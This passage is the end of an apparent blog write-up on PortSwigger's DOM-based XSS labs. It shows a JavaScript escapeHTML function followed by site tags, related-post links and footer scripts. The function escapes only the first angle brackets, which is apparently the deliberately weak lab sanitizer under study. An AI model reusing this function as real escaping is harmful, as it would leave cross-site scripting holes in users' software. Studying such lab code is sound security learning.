</pre><td class="rouge-code"><pre> <span class="kd">function</span> <span class="nx">escapeHTML</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">html</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">&amp;lt;</span><span class="dl">'</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">&gt;</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">&amp;gt;</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-application/'>Web Application</a>, <a href='/categories/cross-site-scripting/'>Cross Site Scripting</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/cross-site-scripting/" class="post-tag no-text-decoration" >Cross Site Scripting</a> <a href="/tags/dom-based-xss/" class="post-tag no-text-decoration" >DOM-based XSS</a> <a href="/tags/portswigger/" class="post-tag no-text-decoration" >Portswigger</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS) - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/DOM-XSS/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS) - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/DOM-XSS/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS) - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/DOM-XSS/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/stored_XSS/"><div class="card-body"> <em class="timeago small" date="2023-01-25 08:00:00 +0100" >Jan 25</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</h3><div class="text-muted small"><p> Intro This post/writeup is all about the stored XSS Vulnerabilities. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well. To learn ...</p></div></div></a></div><div class="card"> <a href="/posts/Reflected_XSS/"><div class="card-body"> <em class="timeago small" date="2022-10-04 09:00:00 +0200" >Oct 4, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Reflected Cross-Site Scripting (XSS)</h3><div class="text-muted small"><p> Intro This post is dedicated to XSS related Labs at Portswigger Web Academy TOC Intro TOC Finding a XSS Reflected XSS into HTML context with nothing encoded Reflected ...</p></div></div></a></div><div class="card"> <a href="/posts/websockets/"><div class="card-body"> <em class="timeago small" date="2023-01-15 08:00:00 +0100" >Jan 15</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Websockets</h3><div class="text-muted small"><p> Intro This post/writeup is all about the insecure deserialization vulnerabilities. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as we...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/mentor/" class="btn btn-outline-primary" prompt="Older"><p>(HTB) - Mentor</p></a> <a href="/posts/Broscience/" class="btn btn-outline-primary" prompt="Newer"><p>(HTB) - BroScience</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
